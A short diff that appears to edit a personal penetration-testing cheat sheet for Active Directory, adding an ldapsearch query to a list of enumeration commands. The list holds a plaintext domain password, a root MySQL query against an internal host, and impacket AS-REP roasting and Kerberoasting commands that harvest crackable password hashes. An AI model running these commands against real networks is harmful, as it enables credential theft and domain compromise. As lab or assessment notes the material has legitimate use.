@@ -37,6 +37,7 @@
     shares
     use
     mysql -h 172.16.1.10 -u root@localhost -e 'show databases;'
+    ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "" -s base "(objectClass=*)" | grep -v 'supported'
     ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
     impacket-GetNPUsers -usersfile usernames domain/ -dc-ip 172.16.1.10
     impacket-GetUserSPNs -request-user "$objuser" -dc-ip 172.16.1.10 domain/username:password
